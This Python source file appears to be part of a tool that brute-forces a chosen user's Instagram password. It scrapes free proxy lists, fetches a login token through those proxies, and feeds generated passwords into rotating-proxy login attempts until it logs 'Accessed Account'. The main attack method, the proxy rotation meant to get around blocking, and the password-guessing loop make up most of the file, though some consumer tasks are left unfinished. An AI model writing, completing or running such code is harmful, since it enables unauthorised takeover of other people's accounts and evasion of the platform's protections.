from __future__ import absolute_import

import logging
import logging.config

import asyncio
import time
import signal

from app import settings

from app.lib import exceptions
from app.lib.logging import EngineLogger
from app.lib.sessions import InstagramSession, ProxySession
from app.lib.users import User
from app.lib.utils import auto_logger


__all__ = ('EngineAsync', )


class Engine(object):

    __loggers__ = {
        '__base__': 'Instagram Engine',
        'attack': 'Attack',
        'consume_passwords': 'Login with Proxy',
        'populate_proxies': 'Populating Proxies',
        'populate_passwords': 'Populating Passwords',
        'get_token': 'Fetching Token',
        'consume_attempts': 'Storing Attempted Password',
    }

    def __init__(self, username):
        self.user = User(username)

        logging.setLoggerClass(EngineLogger)
        self.log = logging.getLogger(self.__loggers__['__base__'])


class EngineAsync(Engine):

    def __init__(self, username):
        super(EngineAsync, self).__init__(username)
        self.lock = asyncio.Lock()

        self.stop_event = asyncio.Event()
        self.token_event = asyncio.Event()

        self.passwords = asyncio.Queue()
        self.attempts = asyncio.Queue()

        self.token = None
        self.proxy_list = []

        # Just to make sure we are removing them correctly
        self.removed_proxies = []

    def _handle_login_api_error(self, e, log, proxy):
        """
        OLD CODE:

        Not currently being used, but we are going to have to deal with the
        GENERIC_REQUEST_ERROR when we start trying to login.

        We need a way to distinguish between a bad proxy error that should
        result in the proxy being updated or an error that requires just
        sleeping and maintaining the same proxy, since if results is None,
        the method will just update the proxy.
        """
        if e.__sleep__:
            log.warn(f'{e.__class__.__name__}... Sleeping {proxy.ip}')
            time.sleep(0.5)
        elif isinstance(e, exceptions.ApiBadProxyException):
            log.warn(f'{e.__class__.__name__} Bad Proxy {proxy.ip}')
        elif isinstance(e, exceptions.ApiClientException):
            if e.error_type == settings.GENERIC_REQUEST_ERROR:
                log.warn(f'Found Bad Proxy w Generic Request Error {proxy.ip}')
            else:
                raise e

    @auto_logger
    async def populate_passwords(self, queue, log):
        """
        Retrieves passwords generated passwords that have not been attempted
        from the User object and populates the password queue.
        """
        count = 1
        for password in self.user.get_new_attempts():
            count += 1
            queue.put_nowait(password)

        if queue.empty():
            raise exceptions.EngineException("No new passwords to try.")

        log.info(f"Populated {count} Passwords")

    @auto_logger
    async def populate_proxies(self, log):
        """
        Retrieves proxies by using the ProxyApi to scrape links defined
        in settings.  Each returned response is parsed and converted into
        a list of Proxy objects.
        """
        def callback(fut):
            result = fut.result()
            for proxy in result:
                if proxy not in self.proxy_list:
                    self.proxy_list.append(proxy)

        tasks = []
        async with ProxySession() as session:
            for url in settings.PROXY_LINKS:
                log.info(f"Scraping Proxies at {url}")
                task = asyncio.ensure_future(session.get_proxies(
                    url,
                ))
                tasks.append(task)
                task.add_done_callback(callback)

            log.info(f"Scraping Proxies at {settings.EXTRA_PROXY}")
            task = asyncio.ensure_future(session.get_extra_proxies())
            tasks.append(task)
            task.add_done_callback(callback)

            await asyncio.gather(*tasks, return_exceptions=True)

        log.info(f"Populated {len(self.proxy_list)} Proxies")

    @auto_logger(show_running=False)
    async def get_token(self, log):
        """
        TODO:
        -----
        Right now this is only doing one fetch at a time, which seems to be okay
        since it is rather fast, but we might want to create tasks for the first
        10 or so proxies.

        There seem to be issues when creating a task for every single
        proxy when we don't really need to, so maybe just limit them
        for purposes of finding a token.

        This might be a good place for ThreadPoolExecutor to limit number
        of tasks.

        loop = asyncio.get_event_loop()
        event = asyncio.Event()
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)

        tasks = [
            loop.run_in_executor(executor, self._get_token, event)
            for i in range(10)
        ]

        completed, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
        result = completed.pop()
        self.token = result.result()

        Won't let us use "async with lock" inside of callback since it is not
        async, but this might cause problems if the proxy was already removed.
        """
        tasks = []

        stop_event = asyncio.Event()
        lock = asyncio.Lock()

        def callback(fut):
            exc = fut.exception()
            if exc:
                if isinstance(exc, exceptions.BadProxyException):
                    self.log.warn(str(exc))
                    self.proxy_list.remove(proxy)

                    # Storing temporarily to make sure we are removing them and not
                    # using them again.
                    self.removed_proxies.append(proxy)
                else:
                    raise exc
            else:
                if not self.token:
                    self.token = fut.result()
                    log.success(f"Found Token {self.token}")

                    stop_event.set()
                    [task.cancel() for task in tasks]

        async with InstagramSession() as session:
            index = 0
            while not stop_event.is_set() and len(self.proxy_list) != 0 and not self.token:
                async with lock:
                    proxy = self.proxy_list[index]

                task = asyncio.ensure_future(session.get_token(proxy))
                task.add_done_callback(callback)
                index += 1

                tasks.append(task)

                # Note commont in docstring for why this is not outside the
                # while loop.
                await asyncio.gather(*tasks, return_exceptions=True)

    @auto_logger
    async def attack(self, loop, log):

        # May want to catch other signals too - these are not currently being
        # used, but could probably be expanded upon.
        signals = (signal.SIGHUP, signal.SIGTERM, signal.SIGINT)
        for s in signals:
            loop.add_signal_handler(
                s, lambda s=s: asyncio.create_task(self.shutdown(s, loop)))

        try:
            prep_tasks = (
                loop.create_task(
                    self.handle_exception(
                        self.populate_proxies(), loop
                    )
                ),
                loop.create_task(
                    self.handle_exception(
                        self.populate_passwords(self.passwords), loop
                    )
                )
            )

            await asyncio.gather(*prep_tasks)

            retrieve_token = loop.create_task(
                self.handle_exception(
                    self.get_token(), loop
                )
            )
            await asyncio.gather(retrieve_token)

            """
            Still To Do:

            consume_passwords = loop.create_task(
                self.handle_exception(
                    self.consume_passwords(self.passwords), loop
                )
            )
            consume_attempts = loop.create_task(
                self.handle_exception(
                    self.consume_attempts(self.attempts), loop
                )
            )
            """
        finally:
            logging.info('Cleaning up')
            loop.stop()

    @auto_logger(show_running=False)
    async def consume_attempts(self, queue, log):
        while not self.stop_event.is_set():
            try:
                attempt = queue.get_nowait()
            except asyncio.QueueEmpty:
                continue
            else:
                async with self.lock:
                    self.user.add_password_attempt(attempt)

    @auto_logger(show_running=False)
    async def consume_passwords(self, queue, log):
        while not self.stop_event.is_set():
            try:
                password = queue.get_nowait()
            except asyncio.QueueEmpty:
                continue
            else:
                # This will eventually throw an error when there are no more
                # proxies, which we will have to figure out how to handle.
                proxy = self.proxy_list[0]

                log.items(password=password, proxy=proxy.ip)

                session = InstagramSession(self.user, proxy=proxy)
                try:
                    results = session.login(password, self.token)

                # TODO: Have to handle this better for siutations in which the
                # proxy is actually invalid instead of just a timeout.
                except exceptions.ApiException as e:
                    self._handle_login_api_error(e, log, proxy)
                    async with self.lock:
                        self.proxy_list.remove(proxy)
                else:
                    # self.queues.put('proxy', proxy)
                    log.info(f"Got Results for {password}: {results}")

                    if results.accessed:
                        self.log.success("Accessed Account... Setting Stop Event")
                        self.stop_event.set()
                        queue.task_done()
                    else:
                        self.attempts.put_nowait(password)
                    return results

    async def handle_exception(self, coro, loop):
        try:
            await coro
        except Exception as e:
            self.log.error(str(e))
            loop.stop()

    async def shutdown(self, signal, loop):

        self.log.info(f'Received exit signal {signal.name}...')
        tasks = [t for t in asyncio.all_tasks() if t is not
            asyncio.current_task()]

        [task.cancel() for task in tasks]

        self.log.info('Canceling outstanding tasks...')
        await asyncio.gather(*tasks)

        loop.stop()
        self.log.success('Shutdown complete.')
